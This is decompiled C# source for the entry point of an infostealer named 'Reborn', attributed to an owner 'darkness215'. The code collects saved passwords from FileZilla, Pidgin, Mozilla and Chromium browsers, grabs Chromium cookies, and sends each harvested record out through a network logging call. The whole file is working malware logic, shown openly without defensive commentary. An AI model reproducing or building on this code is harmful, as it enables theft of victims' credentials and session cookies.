using System;
using System.Collections.Generic;
using Reborn.Browsers;
using Reborn.Cookies;
using Reborn.FTP;
using Reborn.IM;

namespace Reborn
{
	// Token: 0x02000017 RID: 23
	internal static class Program
	{
		// Token: 0x060000B3 RID: 179 RVA: 0x00007B30 File Offset: 0x00005D30
		private static void Main(string[] args)
		{
			Settings.Version = "v1.0.2";
			Settings.Owner = "darkness215";
			Network.UserRequest();
			List<PassData> list = new List<PassData>();
			Program.GetPasswords(ref list);
			using (List<PassData>.Enumerator enumerator = list.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					Network.LogRequest(enumerator.Current);
				}
			}
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x00007BA4 File Offset: 0x00005DA4
		private static void GetPasswords(ref List<PassData> list)
		{
			List<PassData> list2 = FileZilla.Initialise();
			if (list2 != null)
			{
				list.AddRange(list2);
			}
			List<PassData> list3 = Pidgin.Initialise();
			if (list3 != null)
			{
				list.AddRange(list3);
			}
			List<PassData> list4 = Mozilla.Initialise();
			if (list4 != null)
			{
				list.AddRange(list4);
			}
			List<PassData> list5 = Reborn.Browsers.Chromium.Initialise();
			if (list5 != null)
			{
				list.AddRange(list5);
			}
			Reborn.Cookies.Chromium.Initialise();
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x00002C78 File Offset: 0x00000E78
		static void smethod_0()
		{
			Network.UserRequest();
		}

		// Token: 0x060000B6 RID: 182 RVA: 0x00002C7F File Offset: 0x00000E7F
		static void smethod_1(PassData passData_0)
		{
			Network.LogRequest(passData_0);
		}
	}
}
